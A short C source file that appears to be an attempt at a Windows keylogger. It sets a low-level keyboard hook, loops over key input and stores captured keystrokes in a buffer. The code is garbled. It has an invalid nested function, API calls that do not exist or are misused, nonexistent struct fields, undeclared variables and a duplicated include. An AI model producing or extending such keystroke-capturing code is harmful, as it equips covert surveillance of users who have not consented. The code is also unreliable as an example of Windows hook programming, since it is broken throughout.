```c
#include <windows.h>
#include <windows.h>
#include <stdio.h>

#define MAX_KEYSTROKE 100

char keystrokes[MAX_KEYSTROKE] = {0};

HHOOK SetKeyboardHook()
{
    static HHOOK hook = 0;
    static int (WINAPI bool, CALLBACK)(struct KBDHRESULT, int, int, int, int)
    {
        return 0;
    };

    hook = SetWindowsHook(WH_KEYBOARD_LL, (HOOKPROC)&( callback ));

    return hook;
}

void UnsetKeyboardHook(HHOOK hhook)
{
    if (hook)
    {
        UnhookWindowsHook(hhook);
        hook = 0;
    }
}

int main()
{
    HHOOK hook = SetKeyboardHook();
    char lastKey = 0;
    DWORD lastError = 0;

    if (!hook)
    {
        printf("Failed to set keyboard hook: %d\n", GetLastError());
        return 1;
    }

    while (true)
    {
        if (GetLastInput((DWORD*)&hook, &lastError))
        {
            PKEYBDINPUT pkbi = (PKEYBDINPUT)lastError;
            if (pkbi->wKeyState[0] & 0x01) // Check if key is pressed
            {
                if (pkbi->wKeyID == 0x30) // '0'
                {
                    sprintf(keystrokes, "%c", '0');
                    if (strlen(keystrokes) >= MAX_KEYSTROKE)
                    {
                        printf("Keystroke buffer full. Last key: %c\n", keystrokes[strlen(keystrokes)-1]);
                        memset(keystrokes, 0, sizeof(keystrokes));
                    }
                }
            }
        }

        Sleep(100); // Prevent high CPU usage
    }

    UnsetKeyboardHook(hook);
    return 0;
}
```

